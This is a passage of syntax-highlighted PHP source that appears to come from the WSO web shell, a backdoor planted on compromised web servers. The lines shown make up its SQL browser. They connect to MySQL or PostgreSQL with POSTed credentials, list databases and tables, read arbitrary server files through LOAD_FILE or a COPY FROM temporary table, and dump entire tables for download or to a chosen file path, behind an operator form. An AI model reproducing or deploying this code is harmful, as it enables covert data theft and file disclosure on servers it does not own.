<span class="lineno">1051</span>                                                                         <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1052</span>                                                                             <span class="k">return</span> <span class="o">@</span><span class="nb">pg_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno">1053</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1054</span>                                                                     <span class="p">}</span>
<span class="lineno">1055</span>                                                                     <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1056</span>                                                                 <span class="p">}</span>
<span class="lineno">1057</span>                                                                 <span class="k">function</span> <span class="nf">listDbs</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1058</span>                                                                     <span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1059</span>                                                                         <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1060</span>                                                                             <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SHOW databases&quot;</span><span class="p">);</span>
<span class="lineno">1061</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1062</span>                                                                         <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1063</span>                                                                             <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT datname FROM pg_database WHERE datistemplate!=&#39;t&#39;&quot;</span><span class="p">);</span>
<span class="lineno">1064</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1065</span>                                                                     <span class="p">}</span>
<span class="lineno">1066</span>                                                                     <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1067</span>                                                                 <span class="p">}</span>
<span class="lineno">1068</span>                                                                 <span class="k">function</span> <span class="nf">listTables</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1069</span>                                                                     <span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1070</span>                                                                         <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1071</span>                                                                             <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SHOW TABLES&#39;</span><span class="p">);</span>
<span class="lineno">1072</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1073</span>                                                                         <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1074</span>                                                                             <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;select table_name from information_schema.tables where table_schema != &#39;information_schema&#39; AND table_schema != &#39;pg_catalog&#39;&quot;</span><span class="p">);</span>
<span class="lineno">1075</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1076</span>                                                                     <span class="p">}</span>
<span class="lineno">1077</span>                                                                     <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1078</span>                                                                 <span class="p">}</span>
<span class="lineno">1079</span>                                                                 <span class="k">function</span> <span class="nf">error</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1080</span>                                                                     <span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1081</span>                                                                         <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1082</span>                                                                             <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_error</span><span class="p">();</span>
<span class="lineno">1083</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1084</span>                                                                         <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1085</span>                                                                             <span class="k">return</span> <span class="o">@</span><span class="nb">pg_last_error</span><span class="p">();</span>
<span class="lineno">1086</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1087</span>                                                                     <span class="p">}</span>
<span class="lineno">1088</span>                                                                     <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1089</span>                                                                 <span class="p">}</span>
<span class="lineno">1090</span>                                                                 <span class="k">function</span> <span class="nf">setCharset</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1091</span>                                                                     <span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1092</span>                                                                         <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1093</span>                                                                             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_set_charset&#39;</span><span class="p">))</span> <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_set_charset</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">);</span>
<span class="lineno">1094</span>                                                                             <span class="k">else</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SET CHARSET &#39;</span> <span class="o">.</span> <span class="nv">$str</span><span class="p">);</span>
<span class="lineno">1095</span>                                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno">1096</span>                                                                         <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1097</span>                                                                             <span class="k">return</span> <span class="o">@</span><span class="nb">pg_set_client_encoding</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
<span class="lineno">1098</span>                                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno">1099</span>                                                                         <span class="p">}</span>
<span class="lineno">1100</span>                                                                         <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1101</span>                                                                     <span class="p">}</span>
<span class="lineno">1102</span>                                                                     <span class="k">function</span> <span class="nf">loadFile</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1103</span>                                                                         <span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1104</span>                                                                             <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1105</span>                                                                                 <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT LOAD_FILE(&#39;&quot;</span> <span class="o">.</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;) as file&quot;</span><span class="p">));</span>
<span class="lineno">1106</span>                                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno">1107</span>                                                                             <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1108</span>                                                                                 <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;CREATE TABLE wso2(file text);COPY wso2 FROM &#39;&quot;</span> <span class="o">.</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;;select file from wso2;&quot;</span><span class="p">);</span>
<span class="lineno">1109</span>                                                                                 <span class="nv">$r</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1110</span>                                                                                 <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="nv">$r</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$i</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
<span class="lineno">1111</span>                                                                                 <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;drop table wso2&#39;</span><span class="p">);</span>
<span class="lineno">1112</span>                                                                                 <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;file&#39;</span> <span class="o">=&gt;</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;</span>
<span class="lineno">1113</span> <span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$r</span><span class="p">));</span>
<span class="lineno">1114</span>                                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno">1115</span>                                                                             <span class="p">}</span>
<span class="lineno">1116</span>                                                                             <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1117</span>                                                                     <span class="p">}</span>
<span class="lineno">1118</span>                                                                     <span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span> <span class="nv">$fp</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1119</span>                                                                         <span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1120</span>                                                                             <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1121</span>                                                                                 <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SHOW CREATE TABLE `&#39;</span> <span class="o">.</span> <span class="nv">$table</span> <span class="o">.</span> <span class="s1">&#39;`&#39;</span><span class="p">);</span>
<span class="lineno">1122</span>                                                                                 <span class="nv">$create</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno">1123</span>                                                                                 <span class="nv">$sql</span> <span class="o">=</span> <span class="nv">$create</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;;</span>
<span class="lineno">1124</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1125</span>                                                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
<span class="lineno">1126</span>                                                                                 <span class="k">else</span> <span class="k">echo</span> <span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="lineno">1127</span>                                                                                 <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM `&#39;</span> <span class="o">.</span> <span class="nv">$table</span> <span class="o">.</span> <span class="s1">&#39;`&#39;</span><span class="p">);</span>
<span class="lineno">1128</span>                                                                                 <span class="nv">$head</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">1129</span>                                                                                 <span class="k">while</span> <span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">1130</span>                                                                                     <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1131</span>                                                                                     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1132</span>                                                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="k">null</span><span class="p">)</span> <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;NULL&quot;</span><span class="p">;</span>
<span class="lineno">1133</span>                                                                                         <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
<span class="lineno">1134</span>                                                                                         <span class="k">else</span> <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span> <span class="o">.</span> <span class="o">@</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
<span class="lineno">1135</span>                                                                                         <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;`&quot;</span> <span class="o">.</span> <span class="nv">$k</span> <span class="o">.</span> <span class="s2">&quot;`&quot;</span><span class="p">;</span>
<span class="lineno">1136</span>                                                                                     <span class="p">}</span>
<span class="lineno">1137</span>                                                                                     <span class="k">if</span> <span class="p">(</span><span class="nv">$head</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1138</span>                                                                                         <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;INSERT INTO `&#39;</span> <span class="o">.</span> <span class="nv">$table</span> <span class="o">.</span> <span class="s1">&#39;` (&#39;</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;) VALUES </span>
<span class="lineno">1139</span> <span class="s2">  (&quot;</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;)&#39;</span><span class="p">;</span>
<span class="lineno">1140</span>                                                                                         <span class="nv">$head</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1141</span>                                                                                     <span class="p">}</span> <span class="k">else</span> <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="lineno">1142</span> <span class="s2">  ,(&quot;</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;)&#39;</span><span class="p">;</span>
<span class="lineno">1143</span>                                                                                     <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
<span class="lineno">1144</span>                                                                                     <span class="k">else</span> <span class="k">echo</span> <span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="lineno">1145</span>                                                                                 <span class="p">}</span>
<span class="lineno">1146</span>                                                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$head</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s2">&quot;;</span>
<span class="lineno">1147</span> 
<span class="lineno">1148</span> <span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1149</span>                                                                                 <span class="k">else</span> <span class="k">echo</span> <span class="p">(</span><span class="s2">&quot;;</span>
<span class="lineno">1150</span> 
<span class="lineno">1151</span> <span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1152</span>                                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno">1153</span>                                                                             <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1154</span>                                                                                 <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM &#39;</span> <span class="o">.</span> <span class="nv">$table</span><span class="p">);</span>
<span class="lineno">1155</span>                                                                                 <span class="k">while</span> <span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">1156</span>                                                                                     <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1157</span>                                                                                     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1158</span>                                                                                         <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span> <span class="o">.</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
<span class="lineno">1159</span>                                                                                         <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
<span class="lineno">1160</span>                                                                                     <span class="p">}</span>
<span class="lineno">1161</span>                                                                                     <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;INSERT INTO &#39;</span> <span class="o">.</span> <span class="nv">$table</span> <span class="o">.</span> <span class="s1">&#39; (&#39;</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;) VALUES (&#39;</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;);&#39;</span> <span class="o">.</span> <span class="s2">&quot;</span>
<span class="lineno">1162</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1163</span>                                                                                     <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
<span class="lineno">1164</span>                                                                                     <span class="k">else</span> <span class="k">echo</span> <span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="lineno">1165</span>                                                                                 <span class="p">}</span>
<span class="lineno">1166</span>                                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno">1167</span>                                                                             <span class="p">}</span>
<span class="lineno">1168</span>                                                                             <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1169</span>                                                                         <span class="p">}</span>
<span class="lineno">1170</span>                                                                     <span class="p">};</span>
<span class="lineno">1171</span>                                                                     <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DbClass</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]);</span>
<span class="lineno">1172</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1173</span>                                                                         <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
<span class="lineno">1174</span>                                                                         <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
<span class="lineno">1175</span>                                                                         <span class="k">switch</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno">1176</span>                                                                             <span class="k">case</span> <span class="s2">&quot;Windows-1251&quot;</span><span class="o">:</span>
<span class="lineno">1177</span>                                                                                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;cp1251&#39;</span><span class="p">);</span>
<span class="lineno">1178</span>                                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno">1179</span>                                                                             <span class="k">case</span> <span class="s2">&quot;UTF-8&quot;</span><span class="o">:</span>
<span class="lineno">1180</span>                                                                                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span>
<span class="lineno">1181</span>                                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno">1182</span>                                                                             <span class="k">case</span> <span class="s2">&quot;KOI8-R&quot;</span><span class="o">:</span>
<span class="lineno">1183</span>                                                                                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8r&#39;</span><span class="p">);</span>
<span class="lineno">1184</span>                                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno">1185</span>                                                                             <span class="k">case</span> <span class="s2">&quot;KOI8-U&quot;</span><span class="o">:</span>
<span class="lineno">1186</span>                                                                                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8u&#39;</span><span class="p">);</span>
<span class="lineno">1187</span>                                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno">1188</span>                                                                             <span class="k">case</span> <span class="s2">&quot;cp866&quot;</span><span class="o">:</span>
<span class="lineno">1189</span>                                                                                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;cp866&#39;</span><span class="p">);</span>
<span class="lineno">1190</span>                                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno">1191</span>                                                                         <span class="p">}</span>
<span class="lineno">1192</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1193</span>                                                                             <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
<span class="lineno">1194</span>                                                                             <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=dump.sql&quot;</span><span class="p">);</span>
<span class="lineno">1195</span>                                                                             <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: text/plain&quot;</span><span class="p">);</span>
<span class="lineno">1196</span>                                                                             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">dump</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1197</span>                                                                             <span class="k">exit</span><span class="p">;</span>
<span class="lineno">1198</span>                                                                         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">],</span> <span class="s1">&#39;w&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1199</span>                                                                             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">dump</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="nv">$fp</span><span class="p">);</span>
<span class="lineno">1200</span>                                                                             <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno">1201</span>                                                                             <span class="nb">unset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno">1202</span>                                                                         <span class="p">}</span> <span class="k">else</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;script&gt;alert(&quot;Error! Can\&#39;t open file&quot;);window.history.back(-1)&lt;/script&gt;&#39;</span><span class="p">);</span>
<span class="lineno">1203</span>                                                                     <span class="p">}</span>
<span class="lineno">1204</span>                                                                     <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno">1205</span>                                                                     <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">1206</span> <span class="s2">&lt;h1&gt;Sql browser&lt;/h1&gt;&lt;div class=content&gt;</span>
<span class="lineno">1207</span> <span class="s2">&lt;form name=&#39;sf&#39; method=&#39;post&#39; onsubmit=&#39;fs(this);&#39;&gt;&lt;table cellpadding=&#39;2&#39; cellspacing=&#39;0&#39;&gt;&lt;tr&gt;</span>
<span class="lineno">1208</span> <span class="s2">&lt;td&gt;Type&lt;/td&gt;&lt;td&gt;Host&lt;/td&gt;&lt;td&gt;Login&lt;/td&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;Database&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;</span>
<span class="lineno">1209</span> <span class="s2">&lt;input type=hidden name=a value=Sql&gt;&lt;input type=hidden name=p1 value=&#39;query&#39;&gt;&lt;input type=hidden name=p2 value=&#39;&#39;&gt;&lt;input type=hidden name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&lt;input type=hidden name=charset value=&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;</span>
<span class="lineno">1210</span> <span class="s2">&lt;td&gt;&lt;select name=&#39;type&#39;&gt;&lt;option value=&#39;mysql&#39; &quot;</span><span class="p">;</span>
<span class="lineno">1211</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mysql&#39;</span><span class="p">)</span> <span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span>
<span class="lineno">1212</span>                                                                     <span class="k">echo</span> <span class="s2">&quot;&gt;MySql&lt;/option&gt;&lt;option value=&#39;pgsql&#39; &quot;</span><span class="p">;</span>
<span class="lineno">1213</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;pgsql&#39;</span><span class="p">)</span> <span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span>
<span class="lineno">1214</span>                                                                     <span class="k">echo</span> <span class="s2">&quot;&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;</span>
<span class="lineno">1215</span> <span class="s2">&lt;td&gt;&lt;input type=text name=sql_host value=&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;localhost&#39;</span> <span class="o">:</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]))</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&lt;/td&gt;</span>
